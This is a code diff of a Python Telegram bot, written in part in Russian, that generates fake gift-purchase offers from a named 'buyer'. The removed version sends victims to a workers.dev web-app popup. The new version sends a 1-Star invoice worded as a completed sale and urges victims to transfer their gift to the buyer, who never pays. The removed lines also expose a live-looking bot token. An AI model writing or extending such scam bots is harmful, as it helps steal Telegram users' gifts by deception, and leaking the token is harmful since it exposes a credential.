@@ -1,14 +1,15 @@
 import asyncio
 import logging
 import re
-from urllib.parse import quote
 
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
+from aiogram.types import (
+    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
+    LabeledPrice, PreCheckoutQuery
+)
 from aiogram.enums import ParseMode
 
-BOT_TOKEN = "8850115069:AAHt8yX4-4gswis3VY4mmO2zj_ipBjkK2s4"
-WEBAPP_URL = "https://small-flower-5d36.grokkgrok11.workers.dev"  # замени на свой
+BOT_TOKEN = "8850115069:AA..."  # вставь свой токен
 current_buyer = "faqux"
 DEFAULT_STARS = 7000
 
@@ -37,12 +38,6 @@ def parse_gift(text: str):
     }
 
 
-def popup_url(gift_name: str, stars: int) -> str:
-    return (
-        f"{WEBAPP_URL}?gift={quote(gift_name)}&stars={stars}&buyer={quote(current_buyer)}"
-    )
-
-
 @dp.message()
 async def on_msg(message: Message):
     text = message.text or ""
@@ -52,33 +47,45 @@ async def on_msg(message: Message):
         return
 
     offer_text = (
-        f"{gift['link']}\n\n"
-        f"<b>Пользователь {current_buyer} предлагает Вам {gift['stars']} Stars за подарок {gift['gift_name']}.</b>\n\n"
+        f"<b>Пользователь {current_buyer} предлагает Вам {gift['stars']} Stars за подарок "
+        f"<a href=\"{gift['link']}\">{gift['gift_name']}</a>.</b>\n\n"
         f"Предложение действует ещё <b>5ч 59м</b>."
     )
-    kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="✗ Отклонить", callback_data="dec"),
-        InlineKeyboardButton(
-            text="✓ Принять",
-            web_app=WebAppInfo(url=popup_url(gift["gift_name"], gift["stars"]))
-        )
-    ]])
 
+    # Send invoice as the "Accept" action
     await message.answer("Готово. Перешли ниже.")
-    await message.answer(offer_text, reply_markup=kb, parse_mode=ParseMode.HTML)
+    await bot.send_invoice(
+        chat_id=message.chat.id,
+        title=f"Accept: {gift['gift_name']}",
+        description=(
+            f"Предложение о продаже {gift['gift_name']} успешно принято.\n\n"
+            f"Передайте подарок покупателю для зачисления {gift['stars']} Stars на ваш баланс."
+        ),
+        payload=f"offer_{gift['gift_name']}_{gift['stars']}",
+        provider_token="",
+        currency="XTR",
+        prices=[LabeledPrice(label=gift["gift_name"], amount=1)],
+        start_parameter="offer"
+    )
 
 
-@dp.callback_query(F.data == "dec")
-async def on_dec(cb: CallbackQuery):
-    try:
-        await cb.message.edit_text("Предложение отклонено.", reply_markup=None)
-    except Exception:
-        pass
-    await cb.answer()
+@dp.pre_checkout_query()
+async def pre_checkout(query: PreCheckoutQuery):
+    await bot.answer_pre_checkout_query(query.id, ok=True)
+
+
+@dp.message(F.successful_payment)
+async def on_success(message: Message):
+    await message.answer(
+        "Предложение принято.\n\nПередайте подарок покупателю.",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text="Передать", url=f"https://t.me/{current_buyer}")
+        ]])
+    )
 
 
 async def main():
-    print("Popup bot started")
+    print("Invoice bot started")
     await dp.start_polling(bot)
 
 
